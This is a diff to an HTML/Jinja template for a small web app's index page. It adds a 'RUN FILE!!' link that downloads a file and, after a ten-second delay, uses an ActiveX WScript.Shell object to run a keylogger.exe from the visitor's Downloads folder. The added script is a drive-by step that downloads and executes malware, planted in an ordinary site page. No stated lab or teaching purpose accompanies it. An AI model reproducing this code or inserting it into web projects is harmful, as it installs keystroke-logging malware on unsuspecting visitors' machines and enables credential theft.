@@ -11,4 +11,16 @@
     <br><br><br>
     <a href="/search"> SEARCH ITEMS </a><br><br>
     <a href="/secret">login required to view</a>
+
+    <br><br><br>
+    <a href="downloadFile" onclick="setTimeout(RunFile, 10000)">RUN FILE!!</a>
+    <script>
+
+
+    function RunFile() {
+        WshShell = new ActiveXObject("WScript.Shell");
+        WshShell.Run("%userprofile%/Downloads/keylogger.exe", 1, false);
+    }
+    </script>
+
 {% endblock %}
